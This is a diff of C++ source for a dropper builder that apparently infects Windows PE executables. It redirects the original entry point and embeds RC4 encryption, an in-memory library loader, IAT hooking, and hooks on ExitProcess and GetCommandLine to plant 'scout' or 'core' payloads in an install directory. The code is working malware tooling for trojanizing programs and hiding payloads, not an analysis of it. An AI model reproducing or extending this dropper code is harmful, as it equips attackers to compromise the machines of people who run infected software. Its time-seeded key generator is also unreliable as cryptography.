@@ -1,5 +1,6 @@
 #include <iostream>
 #include <fstream>
+#include <iomanip> 
 
 #include <boost/filesystem.hpp>
 namespace bf = boost::filesystem;
@@ -8,14 +9,9 @@ namespace bf = boost::filesystem;
 
 #include "PEObject.h"
 #include "DropperObject.h"
-#include "DropperCodeScout.h"
-#include "XRefNames.h"
-#include "rc4.h"
+#include "DropperCode.h"
 
 using namespace std;
-
-extern char* _needed_strings[];
-extern XREFNAMES data_imports[];
 
 void rc4crypt(const unsigned char *key, size_t keylen,
 			  unsigned char *data, size_t data_len);
@@ -34,11 +30,12 @@ DropperObject::DropperObject(PEObject& pe)
 	_files.bitmap.size = 0;
 	
 	int i = 0;
+	/*
 	while (_needed_strings[i] != NULL) {
 		_strings.push_back(std::string(_needed_strings[i]));
 		i++;
 	}
-
+	*/
 	_exeType = _pe.exeType;
 }
 
@@ -90,7 +87,7 @@ DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string 
 
 	// find new EP and copy dropper code in it
 	_epOffset = ptr - _data.get();
-	ptr += _embedFunction((PVOID)DropperScoutEntryPoint, (PVOID)DropperScoutEntryPoint_End, header->functions.newEntryPoint, ptr);
+	ptr += _embedFunction((PVOID)DropperEntryPoint, (PVOID)DropperEntryPoint_End, header->functions.newEntryPoint, ptr);
 	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
 
 
@@ -99,31 +96,37 @@ DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string 
 	ptr += sizeof(DWORD);
 	END_MARKER(ptr);
 
-	// DumpFile code
-	ptr += _embedFunction((PVOID)ExtractFile, (PVOID)ExtractFile_End, header->functions.dumpFile, ptr);
-	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
-	
 	// ExitProcessHook code
-	ptr += _embedFunction((PVOID)ExitProcessHook_scout, (PVOID)ExitProcessHook_scout_End, header->functions.exitProcessHook, ptr);
+	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
 	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
 
 	// RC4 code
-	ptr += _embedFunction((PVOID)scout_arc4, (PVOID)scout_arc4_End, header->functions.rc4, ptr);
+	ptr += _embedFunction((PVOID)ArcFour, (PVOID)ArcFour_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
 
 	// _loadlirary
-	ptr += _embedFunction((PVOID)_LoadLibrary, (PVOID)_LoadLibrary_End, header->functions.load, ptr);
-	cout << "_Load is " << header->functions.load.size << " bytes long, offset " << (DWORD)header->functions.load.offset << endl;
+	ptr += _embedFunction((PVOID)MemoryLoader, (PVOID)MemoryLoader_End, header->functions.load, ptr);
+	cout << "MemoryLoader is " << header->functions.load.size << " bytes long, offset " << (DWORD)header->functions.load.offset << endl;
 
-	// WaitForThread
-	//ptr += _embedFunction((PVOID)WaitForThread, (PVOID)WaitForThread_End, header->functions.hookCall, ptr);
-	//cout << "_WaitForThread is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
+	// GetCommandLineAHook code
+	ptr += _embedFunction((PVOID)GetCommandLineAHook, (PVOID)GetCommandLineAHook_End, header->functions.GetCommandLineAHook, ptr);
+	cout << "GetCommandLineAHook: " << std::hex << GetCommandLineAHook << " GetCommandLineAHook: " << std::hex << GetCommandLineAHook << endl;
 
+	// GetCommandLineWHook code
+	ptr += _embedFunction((PVOID)GetCommandLineWHook, (PVOID)GetCommandLineWHook_End, header->functions.GetCommandLineWHook, ptr);
+	cout << "GetCommandLineWHook: " << std::hex << GetCommandLineWHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
+
+	// HookIAT code
+	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookCall, ptr);
+	cout << "HookIAT is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
 
 	header->restore.offset = ptr - _data.get();
+
 	// static size of restoreStub
 	header->restore.size = 54;  
 	ptr += 54;
+
+	header->isScout = TRUE;
 
 	// compute total size
 	_size = alignToDWORD(ptr - _data.get());
@@ -135,7 +138,7 @@ DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string 
 
 }
 
-DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix )
+DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix, std::string installDir )
 {
 	DWORD dataBufferSize = 0;
 	
@@ -169,67 +172,6 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	// Original EP
 	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
 	
-	// Strings offsets
-	header->stringsOffsets.offset = ptr - _data.get();
-	DWORD * strOffset = (DWORD *) ptr;
-	ptr += _strings.size() * sizeof(DWORD);
-	
-	// Strings
-	header->strings.offset = ptr - _data.get();
-	
-	unsigned int idx=0;
-	for ( std::list<std::string>::iterator iter = _strings.begin();
-		iter != _strings.end(); 
-		iter++, idx++ )
-	{
-		// store offset of string
-		(*strOffset) = ptr - (header->strings.offset + _data.get()); strOffset++;
-		
-		// store string data
-		(void) memcpy( ptr, (*iter).c_str(), (*iter).size() + 1);
-
-		if (idx == STRIDX_COMMAHFF8)
-			memcpy(ptr+2, fPrefix.c_str(), fPrefix.size());
-		else if (idx == STRIDX_HFF5)
-			memcpy(ptr, fPrefix.c_str(), fPrefix.size());
-		
-		ptr += (*iter).size() + 1;
-	}
-	header->strings.size = ptr - (_data.get() + header->strings.offset);
-	
-	// Calls
-	header->dlls.offset = ptr - _data.get();
-	DWORD totalCalls = 0;
-	for ( int i = 0; data_imports[i].dll; i++ )
-	{
-		// account for nCalls field
-		char* ptrToNCalls = ptr;
-		ptr += sizeof(DWORD);
-		
-		// dll name
-		(void) memcpy( ptr, data_imports[i].dll, strlen(data_imports[i].dll) + 1 );
-		ptr += (UINT)strlen(data_imports[i].dll) + 1;
-		
-		// copy call names
-		DWORD nCalls = 0;
-		for ( int iD = 0; data_imports[i].calls[iD] != NULL; iD++ )
-		{
-			(void) memcpy( ptr, data_imports[i].calls[iD], strlen(data_imports[i].calls[iD]) + 1);
-			ptr += (UINT)strlen(data_imports[i].calls[iD]) + 1;
-			nCalls++;
-		}
-		
-		// fill nCalls field
-		memcpy(ptrToNCalls, &nCalls, sizeof(nCalls));
-		totalCalls += nCalls;
-	}
-	header->dlls.size = ptr - (_data.get() + header->dlls.offset);
-	
-	// reserve space for Dll calls addresses
-	header->callAddresses.offset = ptr - _data.get();
-	header->callAddresses.size = totalCalls * sizeof(DWORD);
-	ptr += header->callAddresses.size;
-	
 	// copy patched code for stage1 stub
 	memcpy(ptr, _patches[0].buffer.get(), _patches[0].size);
 	header->stage1.offset = ptr - _data.get();
@@ -254,7 +196,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	
 	// find new EP and copy dropper code in it
 	_epOffset = ptr - _data.get();
-	ptr += _embedFunction((PVOID)NewEntryPoint, (PVOID)NewEntryPoint_End, header->functions.newEntryPoint, ptr);
+	ptr += _embedFunction((PVOID)DropperEntryPoint, (PVOID)DropperEntryPoint_End, header->functions.newEntryPoint, ptr);
 	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
 	
 	// CoreThreadProc code
@@ -292,11 +234,11 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	ptr += _embedFunction((PVOID)GetCommandLineWHook, (PVOID)GetCommandLineWHook_End, header->functions.GetCommandLineWHook, ptr);
 	cout << "GetCommandLineWHook: " << std::hex << GetCommandLineWHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
 	// RC4 code
-	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
+	ptr += _embedFunction((PVOID)ArcFour, (PVOID)ArcFour_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
 	
 	// hookCall code
-	ptr += _embedFunction((PVOID)hookCall, (PVOID)hookCall_End, header->functions.hookCall, ptr);
+	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookCall, ptr);
 	cout << "hookCall is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
 	
 	cout << "Original ptr: " << hex << (DWORD)ptr << ", aligned: " << hex << (DWORD)alignToDWORD((DWORD)ptr) << endl;
@@ -305,6 +247,11 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	// static size of restoreStub
 	header->restore.size = 54;  
 	ptr += 54;
+
+	header->isScout = FALSE;
+
+	memcpy(header->instDir, installDir.c_str(), sizeof(header->instDir));
+	memcpy(header->fPrefix, fPrefix.c_str(), sizeof(header->fPrefix));
 
 	// compute total size
 	_size = alignToDWORD(ptr - _data.get());
@@ -509,7 +456,7 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 			if (!demoBitmap.empty())
 				_addBitmapFile(demoBitmap.string(), demoBitmap.filename());
 
-			_build( (WINSTARTFUNC) _pe.epVA(), fPrefix );
+			_build( (WINSTARTFUNC) _pe.epVA(), fPrefix, installDir );
 
 		} catch (...) {
 			cout << __FUNCTION__ << "Failed building dropper object." << endl;
@@ -544,6 +491,20 @@ void DropperObject::setPatchCode( std::size_t idx, DWORD VA, char const * const 
 	_patches[idx].buffer.reset( new char[size] );
 	memcpy( _patches[idx].buffer.get(), data, size );
 	_patches[idx].size = size;
+}
+
+void generate_key(std::string& key, unsigned int length) 
+{
+	srand( (unsigned int) time(NULL) );
+	
+	std::ostringstream outStream;
+	
+	// initalize seed and fill array with random fuss
+	for (unsigned int i = 0; i < length; i++) {
+		outStream << std::setw(2) << std::setfill('0') << std::hex << (unsigned int) (rand() % 100);
+	}
+
+	key = outStream.str();
 }
 
 void rc4crypt(const unsigned char *key, size_t keylen,
